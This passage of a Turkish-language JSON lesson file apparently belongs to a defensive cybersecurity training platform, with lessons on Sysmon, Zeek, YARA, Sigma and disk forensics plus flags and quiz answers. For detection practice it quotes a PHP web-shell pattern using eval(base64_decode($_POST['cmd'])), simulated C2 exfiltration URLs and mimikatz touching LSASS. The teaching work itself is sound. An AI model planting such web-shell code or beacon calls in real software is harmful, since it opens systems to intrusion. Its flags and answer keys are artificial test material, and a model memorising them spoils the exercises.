                "desc": "Samanlıkta iğne arar gibi binlerce satırlık yazı içinde sadece aradığın kelimeyi içeren satırları süzüp getirir."
            },
            {
                "token": "-iE",
                "role": "Birleşik Parametreler (-i ve -E)",
                "desc": "• -i: Büyük/küçük harf farkını önemseme\n• -E (Extended Regex): Birden fazla kelimeyi veya kalıbı aynı anda aramak için gelişmiş arama modunu aç."
            },
            {
                "token": "\"http|https\"",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (\"http|https\")."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[STRINGS STATIK TRIYAZ ÇIKTISI]",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "https://api.telegram.org/bot7128912/sendMessage [Zararlı C2 Exfiltration...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "http://dark-nexus.lfl/gate.php?beacon=",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[ANALİZ TAMAMLANDI]: Dosya Telegram Bot API'sini gizli C2 tüneli olarak ...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "strings",
                "desc": "Tersine Mühendislik & Zararlı Analizi: Strings Analizi görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `strings fatura_belgesi.exe | grep -iE \"http|https\"` komutunun temel amacı nedir?",
            "options": [
                "Şüpheli fatura_belgesi.exe dosyasının statik strings çıktısını filtreleyerek gömülü C2 sunucu adresini açığa çıkarın.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `strings fatura_belgesi.exe | grep -iE \"http|https\"` komutu ezbere yazılan bir kod değil; strings: Bir çalıştırılabilir dosyanın (exe, bin) içindeki okunabilir insan yazılarını ekrana döker. |: Bir komutun çıktısını diğer komutun girdisine bağlar. grep -iE \"http|https\": Dosya içindeki binlerce anlamsız yazının arasından yalnızca web adreslerini (saldırganın iletişim kurduğu C2 sunucusunu) ayıklar."
        }
    },
    {
        "id": "blue-304",
        "track": "blue",
        "title": "Sysmon & Windows Event IDs: Proses Enjeksiyonu Avı",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "SYSMON & PROCESS INJECTION HUNTING",
        "theory": "### Belleğin İçindeki Hayalet: Prozess Enjeksiyonu Tespiti\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir hırsızın binaya kendi girmek yerine, binadaki temizlikçinin sırt çantasına gizlice bomba veya telsiz koyup içeri sokması gibidir. Saldırgan `explorer.exe` veya `svchost.exe` gibi masum bir sistem prosesinin belleğine kendi zararlı kodunu enjekte eder (CreateRemoteThread).\n\n#### Kritik Sysmon Olay Kimlikleri (Event IDs):\n* **Event ID 1:** Process Creation (Kim kimi başlattı? Parent-Child analizi).\n* **Event ID 8:** CreateRemoteThread (Başka bir prosesin belleğinde iş parçacığı açma - Enjeksiyon alarmı!).\n* **Event ID 10:** ProcessAccess (LSASS belleğine şüpheli okuma isteği - Mimikatz avı!).",
        "mission": "Sysmon günlüğünden LSASS bellek erişim girişimlerini (Event ID 10) filtrelemek için Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10} -MaxEvents 5 komutunu çalıştırın.",
        "expectedCommand": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10} -MaxEvents 5",
        "acceptedCommands": [
            "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10} -MaxEvents 5",
            "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10}",
            "wevtutil qe Microsoft-Windows-Sysmon/Operational /q:\"*[System[(EventID=10)]]\" /c:5"
        ],
        "hintExplanation": "<p><strong>Get-WinEvent:</strong> PowerShell ile modern Windows olay günlüklerini sorgulama cmdlet'idir.</p><p><strong>ID=10:</strong> Sysmon'un proses erişim olay kodudur.</p>",
        "terminalSuccessOutput": "TimeCreated          Id LevelDisplayName Message\n-----------          -- ---------------- -------\n08.11.2026 21:12:01  10 Information      Process accessed:\n  SourceImage: C:\\Users\\Public\\mimikatz.exe\n  TargetImage: C:\\Windows\\System32\\lsass.exe\n  GrantedAccess: 0x1FFFFF (PROCESS_ALL_ACCESS)\n  CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9fb34\n[ALARM!] Mimikatz tarafından LSASS prosesine yetkisiz bellek erişimi tespit edildi!\n[FLAG] LFL{blue_sysmon_event10_lsass_tamper_detected}",
        "flag": "LFL{blue_sysmon_event10_lsass_tamper_detected}",
        "nextId": "blue-305",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Olay Müdahalesi ve Adli Bilişim) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10} -MaxEvents 5` komutunu kullanmamızın sebebi; **Sysmon & Windows Event IDs: Proses Enjeksiyonu Avı** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. Get-WinEvent: PowerShell ile modern Windows olay günlüklerini sorgulama cmdlet'idir. ID=10: Sysmon'un proses erişim olay kodudur.",
        "cmdAnatomy": [
            {
                "token": "Get-WinEvent",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (Get-WinEvent)."
            },
            {
                "token": "-FilterHashtable",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-FilterHashtable)."
            },
            {
                "token": "@{LogName='Microsoft-Windows-Sysmon/Operational';",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (@{LogName='Microsoft-Windows-Sysmon/Operational';)."
            },
            {
                "token": "ID=10}",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (ID=10})."
            },
            {
                "token": "-MaxEvents",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-MaxEvents)."
            },
            {
                "token": "5",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (5)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "TimeCreated          Id LevelDisplayName Message",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "-----------          -- ---------------- -------",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "08.11.2026 21:12:01  10 Information      Process accessed:",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "SourceImage: C:\\Users\\Public\\mimikatz.exe",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "explorer.exe",
                "desc": "Bu odadaki (Sysmon & Windows Event IDs: Proses Enjeksiyonu Avı) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": "svchost.exe",
                "desc": "Bu odadaki (Sysmon & Windows Event IDs: Proses Enjeksiyonu Avı) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10} -MaxEvents 5` komutunun temel amacı nedir?",
            "options": [
                "Sysmon günlüğünden LSASS bellek erişim girişimlerini (Event ID 10) filtrelemek için Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10} -MaxEvents 5",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10} -MaxEvents 5` komutu ezbere yazılan bir kod değil; Get-WinEvent: PowerShell ile modern Windows olay günlüklerini sorgulama cmdlet'idir. ID=10: Sysmon'un proses erişim olay kodudur."
        }
    },
    {
        "id": "blue-305",
        "track": "blue",
        "title": "Ağ Tehdit Avı: Zeek ile C2 Beaconing ve Jitter Analizi",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "ZEEK NETWORK BEACON HUNTING",
        "theory": "### Gizli Telsiz Sinyallerini Yakalamak: C2 Beaconing Tespiti\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir casus yakalanmamak için her 60 saniyede bir merkeze 1 saniyelik şifreli fısıltı gönderir. Güvenlik görevlisi günlerce bekler ve bakar ki her 60 saniyede bir aynı kapıdan bir sinyal çıkıyor. Bu periyodik ritim (Beaconing) casusu ele verir.\n\n#### Zeek (Bro) ile Trafik Analizi:\nZeek devasa PCAP dosyalarını ayrıştırıp `conn.log`, `http.log`, `dns.log` gibi tertemiz metin loglarına dönüştürür. `zeek-cut` komutuyla hedef IP'lere giden bağlantı süreleri ve veri baytları süzülerek ritmik bağlantılar anında ifşa edilir.",
        "mission": "Zeek conn.log dosyasından kaynak, hedef IP ve bağlantı sürelerini süzmek için cat conn.log | zeek-cut id.orig_h id.resp_h duration komutunu çalıştırın.",
        "expectedCommand": "cat conn.log | zeek-cut id.orig_h id.resp_h duration",
        "acceptedCommands": [
            "cat conn.log | zeek-cut id.orig_h id.resp_h duration",
            "zeek-cut id.orig_h id.resp_h duration < conn.log",
            "cat conn.log | zeek-cut id.orig_h id.resp_h"
        ],
        "hintExplanation": "<p><strong>zeek-cut:</strong> Zeek loglarındaki belirli sütunları çeken hızlı CLI aracıdır.</p><p><strong>duration:</strong> Bağlantının ne kadar sürdüğünü gösterir.</p>",
        "terminalSuccessOutput": "192.168.1.105   185.220.101.4   60.01\n192.168.1.105   185.220.101.4   60.03\n192.168.1.105   185.220.101.4   59.98\n192.168.1.105   185.220.101.4   60.02\n[TEHDİT KANITI] 185.220.101.4 IP adresine her 60 saniyede bir C2 Beacon gönderildiği doğrulandı!\n[FLAG] LFL{blue_zeek_c2_beaconing_jitter_uncovered}",
        "flag": "LFL{blue_zeek_c2_beaconing_jitter_uncovered}",
        "nextId": "blue-306",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Olay Müdahalesi ve Adli Bilişim) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `cat conn.log | zeek-cut id.orig_h id.resp_h duration` komutunu kullanmamızın sebebi; **Ağ Tehdit Avı: Zeek ile C2 Beaconing ve Jitter Analizi** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. zeek-cut: Zeek loglarındaki belirli sütunları çeken hızlı CLI aracıdır. duration: Bağlantının ne kadar sürdüğünü gösterir.",
        "cmdAnatomy": [
            {
                "token": "cat",
                "role": "Ana Komut (Concatenate / Dosya Oku)",
                "desc": "Bir metin dosyasının içindeki yazıları açıp doğrudan terminal ekranına yazdırır."
            },
            {
                "token": "conn.log",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (conn.log)."
            },
            {
                "token": "|",
                "role": "Boru İşareti (Pipe / Aktarım)",
                "desc": "Sol taraftaki komutun ürettiği ekran çıktısını alır, sağ taraftaki komuta girdi olarak aktarır (iki komutu birbirine bağlar)."
            },
            {
                "token": "zeek-cut",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (zeek-cut)."
            },
            {
                "token": "id.orig_h",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (id.orig_h)."
            },
            {
                "token": "id.resp_h",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (id.resp_h)."
            },
            {
                "token": "duration",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (duration)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "192.168.1.105   185.220.101.4   60.01",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "192.168.1.105   185.220.101.4   60.03",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "192.168.1.105   185.220.101.4   59.98",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "192.168.1.105   185.220.101.4   60.02",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "conn.log",
                "desc": "Bu odadaki (Ağ Tehdit Avı: Zeek ile C2 Beaconing ve Jitter Analizi) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": "http.log",
                "desc": "Bu odadaki (Ağ Tehdit Avı: Zeek ile C2 Beaconing ve Jitter Analizi) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": "dns.log",
                "desc": "Bu odadaki (Ağ Tehdit Avı: Zeek ile C2 Beaconing ve Jitter Analizi) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": "zeek-cut",
                "desc": "Bu odadaki (Ağ Tehdit Avı: Zeek ile C2 Beaconing ve Jitter Analizi) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `cat conn.log | zeek-cut id.orig_h id.resp_h duration` komutunun temel amacı nedir?",
            "options": [
                "Zeek conn.log dosyasından kaynak, hedef IP ve bağlantı sürelerini süzmek için cat conn.log | zeek-cut id.orig_h id.resp_h duration",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `cat conn.log | zeek-cut id.orig_h id.resp_h duration` komutu ezbere yazılan bir kod değil; zeek-cut: Zeek loglarındaki belirli sütunları çeken hızlı CLI aracıdır. duration: Bağlantının ne kadar sürdüğünü gösterir."
        }
    },
    {
        "id": "blue-306",
        "track": "blue",
        "title": "İmza Tabanlı Tehdit Tespiti: YARA ile Web Shell Avcılığı",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "YARA WEBSHELL DETECTION",
        "theory": "### Zararlı Kodun DNA'sını Yakalamak: YARA Kuralları\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir katilin parmak izi veya kolundaki ejderha dövmesi gibidir. Saldırgan dosya adını `resim.jpg` veya `style.css` yapsa bile, dosyanın içindeki `eval(base64_decode($_POST['cmd']))` kod parçasını YARA kuralı anında yakalar.\n\n#### YARA Kuralının Yapısı:\n* **meta:** Kural yazarı, açıklama ve tarih.\n* **strings:** Aranacak metin veya onaltılık (hex) bayt dizgisi.\n* **condition:** Kuralların mantıksal birleşimi (Örn: `filesize < 500KB and 2 of ($s*)`).",
        "mission": "Web dizinindeki PHP web shell dosyalarını YARA kurallarıyla taramak için yara -r /etc/yara/webshell_rules.yar /var/www/html/ komutunu çalıştırın.",
        "expectedCommand": "yara -r /etc/yara/webshell_rules.yar /var/www/html/",
        "acceptedCommands": [
            "yara -r /etc/yara/webshell_rules.yar /var/www/html/",
            "yara /etc/yara/webshell_rules.yar /var/www/html/ -r",
            "yara -r webshell_rules.yar /var/www/html/"
        ],
        "hintExplanation": "<p><strong>yara:</strong> Zararlı yazılım örüntü arama motorudur.</p><p><strong>-r:</strong> Belirtilen dizini alt klasörleriyle birlikte özyinelemeli (recursive) tarar.</p>",
        "terminalSuccessOutput": "PHP_Obfuscated_Webshell /var/www/html/uploads/avatars/profile_42.php\n  0x14f:$eval_str: \"eval(gzinflate(base64_decode(\"\n  0x2a0:$b64_pass: \"c3VwZXJzZWNyZXQ=\"\n[TEHDİT İMHA EDİLDİ] Sahte profil resmi içine gizlenmiş tehlikeli bir PHP Web Shell yakalandı!\n[FLAG] LFL{blue_yara_webshell_signature_hunting_success}",
        "flag": "LFL{blue_yara_webshell_signature_hunting_success}",
        "nextId": "blue-307",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Olay Müdahalesi ve Adli Bilişim) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `yara -r /etc/yara/webshell_rules.yar /var/www/html/` komutunu kullanmamızın sebebi; **İmza Tabanlı Tehdit Tespiti: YARA ile Web Shell Avcılığı** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. yara: Zararlı yazılım örüntü arama motorudur. -r: Belirtilen dizini alt klasörleriyle birlikte özyinelemeli (recursive) tarar.",
        "cmdAnatomy": [
            {
                "token": "yara",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (yara)."
            },
            {
                "token": "-r",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-r)."
            },
            {
                "token": "/etc/yara/webshell_rules.yar",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (/etc/yara/webshell_rules.yar)."
            },
            {
                "token": "/var/www/html/",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (/var/www/html/)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "PHP_Obfuscated_Webshell /var/www/html/uploads/avatars/profile_42.php",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "0x14f:$eval_str: \"eval(gzinflate(base64_decode(\"",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "0x2a0:$b64_pass: \"c3VwZXJzZWNyZXQ=\"",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[TEHDİT İMHA EDİLDİ] Sahte profil resmi içine gizlenmiş tehlikeli bir PH...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "resim.jpg",
                "desc": "Bu odadaki (İmza Tabanlı Tehdit Tespiti: YARA ile Web Shell Avcılığı) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": "style.css",
                "desc": "Bu odadaki (İmza Tabanlı Tehdit Tespiti: YARA ile Web Shell Avcılığı) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `yara -r /etc/yara/webshell_rules.yar /var/www/html/` komutunun temel amacı nedir?",
            "options": [
                "Web dizinindeki PHP web shell dosyalarını YARA kurallarıyla taramak için yara -r /etc/yara/webshell_rules.yar /var/www/html/",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `yara -r /etc/yara/webshell_rules.yar /var/www/html/` komutu ezbere yazılan bir kod değil; yara: Zararlı yazılım örüntü arama motorudur. -r: Belirtilen dizini alt klasörleriyle birlikte özyinelemeli (recursive) tarar."
        }
    },
    {
        "id": "blue-307",
        "track": "blue",
        "title": "Evrensel Tehdit Dili: Sigma Kuralını SIEM Sorgusuna Çevirme",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "SIGMA DETECTION CONVERSION",
        "theory": "### SIEM Üretici Bağımsızlığı: Sigma Standardı\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nDünyada herkesin anladığı ortak İngilizce gibidir. Bir tehdit kuralını bir kez Sigma (YAML) formatında yazarsınız; ardından tek bir komutla Splunk SPL'e, Elastic Lucene'e, Microsoft Sentinel KQL'e veya QRadar AQL'e otomatik dönüştürürsünüz.\n\n#### Sigmac / Sigma-CLI Kullanımı:\n`sigma convert -t splunk rule.yml` çalıştırıldığında YAML kuralı anında `index=windows EventCode=1 Image=*\\whoami.exe` gibi yerel sorgu diline çevrilir.",
        "mission": "whoami_priv.yml kuralını Splunk arama sorgusu formatına dönüştürmek için sigma convert -t splunk rules/windows/whoami_priv.yml komutunu çalıştırın.",
        "expectedCommand": "sigma convert -t splunk rules/windows/whoami_priv.yml",
        "acceptedCommands": [
            "sigma convert -t splunk rules/windows/whoami_priv.yml",
            "sigmac -t splunk rules/windows/whoami_priv.yml",
            "sigma convert -t splunk whoami_priv.yml"
        ],
        "hintExplanation": "<p><strong>sigma convert:</strong> Sigma kuralını hedef SIEM diline derleyen motordur.</p><p><strong>-t splunk:</strong> Çıktıyı Splunk sorgusu olarak üretir.</p>",
        "terminalSuccessOutput": "(EventCode=\"1\" (Image=\"*\\\\whoami.exe\" CommandLine=\"*/priv*\"))\n[DERLEME BAŞARILI] Sigma kuralı geçerli bir Splunk SPL sorgusuna dönüştürüldü!\n[DÖNÜŞÜM TAMAM] SOC analistleri artık bu kuralı SIEM'de canlı uyarıya bağlayabilir.\n[FLAG] LFL{blue_sigma_universal_rule_converted_to_siem}",
        "flag": "LFL{blue_sigma_universal_rule_converted_to_siem}",
        "nextId": "blue-308",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Olay Müdahalesi ve Adli Bilişim) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `sigma convert -t splunk rules/windows/whoami_priv.yml` komutunu kullanmamızın sebebi; **Evrensel Tehdit Dili: Sigma Kuralını SIEM Sorgusuna Çevirme** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. sigma convert: Sigma kuralını hedef SIEM diline derleyen motordur. -t splunk: Çıktıyı Splunk sorgusu olarak üretir.",
        "cmdAnatomy": [
            {
                "token": "sigma",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (sigma)."
            },
            {
                "token": "convert",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (convert)."
            },
            {
                "token": "-t",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-t)."
            },
            {
                "token": "splunk",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (splunk)."
            },
            {
                "token": "rules/windows/whoami_priv.yml",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (rules/windows/whoami_priv.yml)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "(EventCode=\"1\" (Image=\"*\\\\whoami.exe\" CommandLine=\"*/priv*\"))",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[DERLEME BAŞARILI] Sigma kuralı geçerli bir Splunk SPL sorgusuna dönüştü...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[DÖNÜŞÜM TAMAM] SOC analistleri artık bu kuralı SIEM'de canlı uyarıya ba...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "sigma",
                "desc": "Evrensel Tehdit Dili: Sigma Kuralını SIEM Sorgusuna Çevirme görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `sigma convert -t splunk rules/windows/whoami_priv.yml` komutunun temel amacı nedir?",
            "options": [
                "whoami_priv.yml kuralını Splunk arama sorgusu formatına dönüştürmek için sigma convert -t splunk rules/windows/whoami_priv.yml",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `sigma convert -t splunk rules/windows/whoami_priv.yml` komutu ezbere yazılan bir kod değil; sigma convert: Sigma kuralını hedef SIEM diline derleyen motordur. -t splunk: Çıktıyı Splunk sorgusu olarak üretir."
        }
    },
    {
        "id": "blue-308",
        "track": "blue",
        "title": "Disk Adli Bilişimi: $MFT ve Olay Zaman Çizelgesi (Timelining)",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "FORENSIC TIMELINING & MFT",
        "theory": "### Diskin Kara Kutusu: $MFT (Master File Table)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nUçak kazasından sonra uçağın kara kutusunu dinlemek gibidir. Saldırgan dosyayı silse bile NTFS dosya sistemindeki $MFT tablosu dosyanın ne zaman oluşturulduğunu, değiştirildiğini ve silindiğini (MACB: Modified, Accessed, Created, Born) saniyesi saniyesine saklar.\n\n#### Sleuth Kit & Mactime:\n`fls` aracı disk imajındaki tüm dosyaların zaman damgalarını döker; `mactime` ise bunları kronolojik bir olay zincirine (Timeline) dönüştürerek saldırganın hangi saatte hangi dizine girdiğini ortaya koyar.",
        "mission": "fls aracıyla disk imajındaki dosya meta verilerini çekip olay zaman çizelgesini oluşturmak için fls -r -m C: image.dd | head -n 5 komutunu çalıştırın.",
        "expectedCommand": "fls -r -m C: image.dd | head -n 5",
        "acceptedCommands": [
            "fls -r -m C: image.dd | head -n 5",
            "fls -r -m C: image.dd",
            "fls -m C: image.dd | head -n 5"
        ],
        "hintExplanation": "<p><strong>fls:</strong> The Sleuth Kit (TSK) dosya listeleme komutudur.</p><p><strong>-m C::</strong> Dosya yollarını mactime zaman çizelgesi formatında biçimlendirir.</p>",
        "terminalSuccessOutput": "0|C:/Windows/Temp/mimikatz.exe|0|d/drwxrwxrwx|0|0|1024|1762635600|1762635601|1762635601|1762635600\n0|C:/Windows/System32/Tasks/TelemetryUpdate|0|r/rrwxrwxrwx|0|0|2048|1762635720|1762635720|1762635720|1762635720\n[ZAMAN ÇİZELGESİ ÇIKARILDI] 21:00'da zararlı dosyanın yüklendiği ve 21:02'de zamanlanmış görev oluşturulduğu ispatlandı!\n[FLAG] LFL{blue_mft_filesystem_forensic_timeline_created}",
        "flag": "LFL{blue_mft_filesystem_forensic_timeline_created}",
        "nextId": "blue-309",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Olay Müdahalesi ve Adli Bilişim) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `fls -r -m C: image.dd | head -n 5` komutunu kullanmamızın sebebi; **Disk Adli Bilişimi: $MFT ve Olay Zaman Çizelgesi (Timelining)** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. fls: The Sleuth Kit (TSK) dosya listeleme komutudur. -m C:: Dosya yollarını mactime zaman çizelgesi formatında biçimlendirir.",
        "cmdAnatomy": [
            {
                "token": "fls",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (fls)."
            },
            {
                "token": "-r",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-r)."
            },
            {
                "token": "-m",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-m)."
            },
            {
